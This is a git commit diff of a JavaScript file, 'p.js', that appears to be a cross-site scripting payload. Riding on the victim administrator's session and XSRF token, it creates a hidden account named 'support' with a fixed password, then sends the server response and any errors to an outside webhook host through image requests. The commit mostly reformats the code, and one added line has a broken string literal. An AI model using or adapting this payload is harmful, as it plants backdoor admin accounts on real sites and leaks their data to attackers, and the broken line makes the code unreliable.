6fe2db3b898f71ef1ec2eb77bb50f27103c7dd93
cyberkill896-sudo <cyberkill896@gmail.com>
2026-05-20 12:43:38 +0530

    Update p.js

--- p.js
+++ p.js
@@ -3,8 +3,23 @@
   fetch('/admin/security/users',{
     method:'POST',
     credentials:'include',
-    headers:{'Content-Type':'application/json','X-XSRF-TOKEN':t,'Accept':'application/json'},
-    body:JSON.stringify({name:'support',email:'support@evil.com',password:'P@ssword1!',password_confirmation:'P@ssword1!',is_active:true})
-  }).then(function(r){return r.text()})
-    .then(function(d){new Image().src='https://webhooksite.net/586b992b-be17-4fee-beba-6190872e31b9/?r='+btoa(d)});
+    headers:{
+      'Content-Type':'application/json',
+      'X-XSRF-TOKEN':t,
+      'Accept':'application/json'
+    },
+    body:JSON.stringify({
+      name:'support',
+      email:'support@evil.com',
+      password:'P@ssword1!',
+      password_confirmation:'P@ssword1!',
+      is_active:true
+    })
+  }).then(function(r){
+    return r.text();
+  }).then(function(d){
+    new Image().src='https://webhooksite.net/586b992b-be17+encodeURIComponent(d);
+  }).catch(function(e){
+    new Image().src='https://webhooksite.net/586b992b-be17-4fee-beba-6190872e31b9/?err='+encodeURIComponent(e.message);
+  });
 })();
